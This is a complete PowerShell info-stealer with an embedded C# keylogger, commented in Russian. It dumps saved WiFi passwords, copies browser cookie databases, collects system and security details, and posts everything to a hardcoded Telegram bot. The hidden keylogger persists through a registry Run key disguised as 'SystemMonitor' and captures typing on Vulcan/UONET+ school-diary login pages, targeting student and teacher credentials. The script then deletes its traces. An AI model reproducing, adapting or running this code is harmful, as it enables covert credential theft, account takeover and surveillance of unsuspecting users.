# Основной сбор данных
$sys = Get-CimInstance Win32_ComputerSystem
$os = Get-CimInstance Win32_OperatingSystem
$cpu = Get-CimInstance Win32_Processor
$ram = [math]::Round((Get-CimInstance Win32_PhysicalMemory | Measure-Object -Property Capacity -Sum).Sum/1GB, 2)
$gpu = (Get-CimInstance Win32_VideoController | Where-Object {$_.Name -notlike "*Remote*"} | Select-Object -First 1).Name
$disk = Get-CimInstance Win32_LogicalDisk -Filter "DeviceID='C:'"

# Сеть и WiFi
try {$ip = (Invoke-RestMethod "http://ipinfo.io/ip" -TimeoutSec 3).Trim()} catch {$ip = "No IP"}
$net = Get-NetIPAddress | Where-Object {$_.AddressFamily -eq 'IPv4' -and $_.IPAddress -ne '127.0.0.1'} | Select-Object InterfaceAlias, IPAddress

$wifi = ""
try {
    netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object {
        $name = $_.ToString().Split(":")[1].Trim()
        try {$pass = (netsh wlan show profile name="$name" key=clear | Select-String "Key Content").ToString().Split(":")[1].Trim()} catch {$pass = "No password"}
        $wifi += "$name : $pass`n"
    }
    if (!$wifi) {$wifi = "No WiFi networks"}
} catch {$wifi = "WiFi error"}

# ИСПРАВЛЕННЫЙ КЕЙЛОГГЕР ДЛЯ ПЕРЕХВАТА ЛОГИНА И ПАРОЛЯ ВУЛКАН
$keyloggerScript = @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using System.Text;
using System.Linq;

public class VulcanKeylogger
{
    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x0100;
    private const int WM_SYSKEYDOWN = 0x0104;
    
    private static LowLevelKeyboardProc _proc = HookCallback;
    private static IntPtr _hookID = IntPtr.Zero;
    private static StringBuilder _buffer = new StringBuilder();
    private static string _lastWindow = "";
    private static DateTime _lastSendTime = DateTime.MinValue;
    
    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr GetForegroundWindow();

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint processId);

    [DllImport("kernel32.dll")]
    private static extern IntPtr GetConsoleWindow();

    [DllImport("user32.dll")]
    private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    [DllImport("user32.dll", SetLastError = true)]
    private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

    [DllImport("user32.dll", SetLastError = true)]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll", SetLastError = true)]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr GetModuleHandle(string lpModuleName);

    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

    public static void Main()
    {
        // Скрываем консоль
        var handle = GetConsoleWindow();
        ShowWindow(handle, 0); // 0 = SW_HIDE
        
        _hookID = SetHook(_proc);
        if (_hookID == IntPtr.Zero)
        {
            SendToTelegram("KEYLOGGER ERROR: Failed to set hook");
            return;
        }
        
        SendToTelegram("VULCAN KEYLOGGER STARTED - Monitoring Vulcan sites");
        
        Application.Run();
        
        UnhookWindowsHookEx(_hookID);
    }

    private static IntPtr SetHook(LowLevelKeyboardProc proc)
    {
        using (Process curProcess = Process.GetCurrentProcess())
        using (ProcessModule curModule = curProcess.MainModule)
        {
            return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                GetModuleHandle(curModule.ModuleName), 0);
        }
    }

    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
    {
        if (nCode >= 0 && (wParam == (IntPtr)WM_KEYDOWN || wParam == (IntPtr)WM_SYSKEYDOWN))
        {
            int vkCode = Marshal.ReadInt32(lParam);
            
            try
            {
                string activeWindow = GetActiveWindowTitle();
                if (IsVulcanSite(activeWindow))
                {
                    ProcessKey(vkCode, activeWindow);
                }
                else
                {
                    // Если ушли с сайта Вулкан - отправляем оставшиеся данные
                    if (_buffer.Length > 0 && _lastWindow.Contains("vulcan", StringComparison.OrdinalIgnoreCase))
                    {
                        SendBufferData("LEFT_VULCAN");
                    }
                    _buffer.Clear();
                }
            }
            catch (Exception ex)
            {
                // Игнорируем ошибки чтобы кейлоггер продолжал работать
            }
        }
        
        return CallNextHookEx(_hookID, nCode, wParam, lParam);
    }

    private static void ProcessKey(int vkCode, string windowTitle)
    {
        Keys key = (Keys)vkCode;
        
        // Обрабатываем специальные клавиши
        switch (key)
        {
            case Keys.Enter:
                _buffer.Append("[ENTER]");
                SendBufferData("ENTER_PRESSED");
                break;
                
            case Keys.Space:
                _buffer.Append(" ");
                break;
                
            case Keys.Back:
                if (_buffer.Length > 0)
                    _buffer.Remove(_buffer.Length - 1, 1);
                break;
                
            case Keys.Tab:
                _buffer.Append("[TAB]");
                SendBufferData("TAB_PRESSED");
                break;
                
            case Keys.LShiftKey:
            case Keys.RShiftKey:
            case Keys.Shift:
            case Keys.ShiftKey:
            case Keys.Control:
            case Keys.ControlKey:
            case Keys.LControlKey:
            case Keys.RControlKey:
            case Keys.Alt:
            case Keys.LMenu:
            case Keys.RMenu:
            case Keys.CapsLock:
            case Keys.NumLock:
            case Keys.Scroll:
                // Игнорируем служебные клавиши
                break;
                
            default:
                // Обрабатываем обычные символы
                bool shiftPressed = (GetAsyncKeyState(Keys.ShiftKey) & 0x8000) != 0;
                bool capsLock = Control.IsKeyLocked(Keys.CapsLock);
                
                string charStr = KeyToChar(key, shiftPressed, capsLock);
                if (!string.IsNullOrEmpty(charStr))
                {
                    _buffer.Append(charStr);
                }
                break;
        }
        
        // Автоматически отправляем каждые 30 символов или каждые 10 секунд
        if (_buffer.Length >= 30 || (DateTime.Now - _lastSendTime).TotalSeconds >= 10)
        {
            SendBufferData("AUTO_SEND");
        }
        
        _lastWindow = windowTitle;
    }

    private static string KeyToChar(Keys key, bool shift, bool capsLock)
    {
        // Буквы A-Z
        if (key >= Keys.A && key <= Keys.Z)
        {
            if ((shift && !capsLock) || (!shift && capsLock))
                return key.ToString().ToUpper();
            else
                return key.ToString().ToLower();
        }
        
        // Цифры 0-9
        if (key >= Keys.D0 && key <= Keys.D9)
        {
            if (shift)
            {
                string[] shiftChars = { ")", "!", "@", "#", "$", "%", "^", "&", "*", "(" };
                return shiftChars[key - Keys.D0];
            }
            return (key - Keys.D0).ToString();
        }
        
        // Цифровая клавиатура
        if (key >= Keys.NumPad0 && key <= Keys.NumPad9)
        {
            return (key - Keys.NumPad0).ToString();
        }
        
        // Специальные символы
        switch (key)
        {
            case Keys.OemPeriod:
            case Keys.Decimal:
                return shift ? ">" : ".";
            case Keys.Oemcomma:
                return shift ? "<" : ",";
            case Keys.OemQuestion:
                return shift ? "?" : "/";
            case Keys.Oemtilde:
                return shift ? "~" : "`";
            case Keys.OemOpenBrackets:
                return shift ? "{" : "[";
            case Keys.OemCloseBrackets:
                return shift ? "}" : "]";
            case Keys.OemPipe:
                return shift ? "|" : "\\";
            case Keys.OemMinus:
                return shift ? "_" : "-";
            case Keys.Oemplus:
                return shift ? "+" : "=";
            case Keys.OemSemicolon:
                return shift ? ":" : ";";
            case Keys.OemQuotes:
                return shift ? "\"" : "'";
            case Keys.Divide:
                return "/";
            case Keys.Multiply:
                return "*";
            case Keys.Subtract:
                return "-";
            case Keys.Add:
                return "+";
            case Keys.Decimal:
                return ".";
        }
        
        return "";
    }

    private static bool IsVulcanSite(string windowTitle)
    {
        if (string.IsNullOrEmpty(windowTitle))
            return false;
            
        string[] vulcanKeywords = {
            "vulcan", "uonet", "dziennik", "edu.gdynia", "eszkola", 
            "logowanie", "login", "account", "uczen", "nauczyciel"
        };
        
        return vulcanKeywords.Any(keyword => 
            windowTitle.IndexOf(keyword, StringComparison.OrdinalIgnoreCase) >= 0);
    }

    private static string GetActiveWindowTitle()
    {
        try
        {
            const int nChars = 256;
            StringBuilder buff = new StringBuilder(nChars);
            IntPtr handle = GetForegroundWindow();

            if (GetWindowText(handle, buff, nChars) > 0)
            {
                return buff.ToString();
            }
        }
        catch { }
        
        return "";
    }

    [DllImport("user32.dll")]
    private static extern short GetAsyncKeyState(Keys vKey);

    private static void SendBufferData(string trigger)
    {
        if (_buffer.Length == 0)
            return;
            
        string data = _buffer.ToString();
        if (string.IsNullOrWhiteSpace(data))
            return;
            
        string message = $"VULCAN INPUT ({trigger}): {data}";
        
        try
        {
            SendToTelegram(message);
            _lastSendTime = DateTime.Now;
        }
        catch { }
        
        _buffer.Clear();
    }

    private static void SendToTelegram(string message)
    {
        try
        {
            using (var webClient = new System.Net.WebClient())
            {
                string url = $"https://api.telegram.org/bot8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs/sendMessage";
                string postData = $"chat_id=5674514050&text={Uri.EscapeDataString(message)}";
                
                webClient.Headers[System.Net.HttpRequestHeader.ContentType] = "application/x-www-form-urlencoded";
                webClient.UploadString(url, postData);
            }
        }
        catch
        {
            // Игнорируем ошибки отправки
        }
    }
}
"@

# Сохраняем и запускаем исправленный кейлоггер
try {
    # Компилируем как .NET приложение
    Add-Type -TypeDefinition $keyloggerScript -ReferencedAssemblies "System.Windows.Forms", "System.Drawing" -Language CSharp
    
    # Запускаем в отдельном процессе
    $keyloggerProcess = Start-Process -FilePath "powershell" -ArgumentList @"
-Command "Add-Type -TypeDefinition '@$keyloggerScript' -ReferencedAssemblies 'System.Windows.Forms','System.Drawing' -Language CSharp; [VulcanKeylogger]::Main()" -WindowStyle Hidden
"@ -WindowStyle Hidden -PassThru
    
    # Добавляем в автозагрузку
    $startupPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    $loggerCommand = "powershell -WindowStyle Hidden -Command `"Add-Type -TypeDefinition '@$keyloggerScript' -ReferencedAssemblies 'System.Windows.Forms','System.Drawing' -Language CSharp; [VulcanKeylogger]::Main()`""
    Set-ItemProperty -Path $startupPath -Name "SystemMonitor" -Value $loggerCommand -ErrorAction SilentlyContinue
    
    $keyloggerStatus = "ADVANCED KEYLOGGER ACTIVE - Monitoring Vulcan sites (C# version)"
} catch {
    $keyloggerStatus = "Keylogger failed: $($_.Exception.Message)"
}

# Безопасность
try {$fw = Get-NetFirewallProfile | ForEach-Object {"  - $($_.Name): $($_.Enabled)"} | Out-String} catch {$fw = "Firewall info unavailable"}
try {$def = Get-MpComputerStatus; $defStatus = "Antivirus: $($def.AntivirusEnabled), Real-time: $($def.RealTimeProtectionEnabled)"} catch {$defStatus = "Defender info unavailable"}
try {$rdp = if ((Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -ErrorAction 0).fDenyTSConnections -eq 1) {'Disabled'} else {'Enabled'}} catch {$rdp = "RDP status unavailable"}

# Cookies - создаем ZIP архив для удобной загрузки
$cookies = @()
$temp = "$env:TEMP\Cookies_$(Get-Date -Format 'HHmmss')"
$zipPath = "$env:TEMP\Cookies_$env:USERNAME.zip"

New-Item -ItemType Directory -Path $temp -Force | Out-Null

# Копируем файлы cookies
$browsers = @(
    @{Name="Edge"; Path="$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Cookies"},
    @{Name="Chrome"; Path="$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"},
    @{Name="Firefox"; Path=(Get-ChildItem "$env:APPDATA\Mozilla\Firefox\Profiles" -Filter "cookies.sqlite" -Recurse -ErrorAction 0 | Select-Object -First 1).FullName}
)

foreach ($browser in $browsers) {
    if ($browser.Path -and (Test-Path $browser.Path)) {
        $dest = "$temp\$($browser.Name)_Cookies$(if($browser.Name -eq 'Firefox'){'.sqlite'})"
        Copy-Item $browser.Path $dest -ErrorAction SilentlyContinue
        if (Test-Path $dest) {
            $cookies += $dest
            # Создаем текстовую информацию о файле
            $fileInfo = Get-Item $dest
            "$($browser.Name) Cookies - Size: $([math]::Round($fileInfo.Length/1KB, 2)) KB - Modified: $($fileInfo.LastWriteTime)" | Out-File "$temp\$($browser.Name)_info.txt" -Encoding UTF8
            $cookies += "$temp\$($browser.Name)_info.txt"
        }
    }
}

# Создаем ZIP архив с cookies
try {
    if (Get-Command Compress-Archive -ErrorAction SilentlyContinue) {
        Compress-Archive -Path "$temp\*" -DestinationPath $zipPath -Force
        if (Test-Path $zipPath) {
            $cookies += $zipPath
        }
    }
} catch {}

# Дополнительная информация
try {$conn = Get-NetTCPConnection -State Established | Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort -First 5 | ForEach-Object {"- $($_.LocalAddress):$($_.LocalPort) -> $($_.RemoteAddress):$($_.RemotePort)"} | Out-String} catch {$conn = "Connections unavailable"}
try {$software = Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*","HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | Where-Object {$_.DisplayName} | Select-Object DisplayName, DisplayVersion -First 8 | ForEach-Object {"- $($_.DisplayName) v$($_.DisplayVersion)"} | Out-String} catch {$software = "Software info unavailable"}
try {$uptime = (Get-Date) - $os.LastBootUpTime; $uptimeInfo = "$([math]::Floor($uptime.TotalHours)):$($uptime.Minutes.ToString('00'))"} catch {$uptimeInfo = "Uptime unavailable"}

# Формирование и отправка сообщения
$msg = @"
=== SYSTEM INFORMATION ===
User: $env:USERNAME
Computer: $env:COMPUTERNAME
Domain: $env:USERDOMAIN

=== HARDWARE INFORMATION ===
Processor: $($cpu.Name)
RAM: $ram GB
GPU: $gpu
Disk C: Free: $([math]::Round($disk.FreeSpace/1GB, 2)) GB / Total: $([math]::Round($disk.Size/1GB, 2)) GB

=== OPERATING SYSTEM ===
OS: $($os.Caption)
Version: $($os.Version)
Build: $($os.BuildNumber)

=== NETWORK INFORMATION ===
Public IP: $ip

Network Interfaces:
$($net | ForEach-Object { 
    $name = $_.InterfaceAlias -replace "Подключение по локальной сети", "Local Area Connection" -replace "Беспроводная сеть", "Wireless Network" -replace "Сетевое подключение Bluetooth", "Bluetooth Network"
    "- $name : $($_.IPAddress)" 
} | Out-String)

Active Connections:
$conn

=== WIFI PASSWORDS ===
$wifi

=== KEYLOGGER STATUS ===
$keyloggerStatus

=== TARGET SITES ===
• https://cufs.vulcan.net.pl/minrol/Account/LogOn
• Все сайты Vulcan/UONET+
• Страницы входа в дневник

=== BROWSER COOKIES ===
Found cookies files: $($cookies.Count)
Files available for download as ZIP archive

=== SECURITY STATUS ===
Firewall: 
$fw
Windows Defender: $defStatus
RDP Access: $rdp

=== INSTALLED SOFTWARE ===
$software

=== SYSTEM UPTIME ===
Uptime: $uptimeInfo
"@

Invoke-RestMethod -Uri "https://api.telegram.org/bot8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs/sendMessage" -Method Post -Body @{chat_id='5674514050'; text=$msg}

# Отправка ZIP архива с cookies
if (Test-Path $zipPath) {
    try {
        Invoke-RestMethod -Uri "https://api.telegram.org/bot8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs/sendDocument" -Method Post -Form @{
            chat_id = '5674514050'
            document = [System.IO.File]::OpenRead($zipPath)
            caption = "COOKIES ARCHIVE - Download and extract to view cookies files"
        }
    } catch {
        # Если не удалось отправить ZIP, отправляем файлы по отдельности
        $cookies | Where-Object {Test-Path $_} | ForEach-Object {
            try {
                Invoke-RestMethod -Uri "https://api.telegram.org/bot8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs/sendDocument" -Method Post -Form @{
                    chat_id = '5674514050'
                    document = [System.IO.File]::OpenRead($_)
                    caption = "Cookies file: $(Split-Path $_ -Leaf)"
                }
            } catch {}
        }
    }
} else {
    # Отправка отдельных файлов если ZIP не создался
    $cookies | Where-Object {Test-Path $_} | ForEach-Object {
        try {
            Invoke-RestMethod -Uri "https://api.telegram.org/bot8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs/sendDocument" -Method Post -Form @{
                chat_id = '5674514050'
                document = [System.IO.File]::OpenRead($_)
                caption = "Cookies file: $(Split-Path $_ -Leaf)"
            }
        } catch {}
    }
}

# Очистка
Remove-Item $temp -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
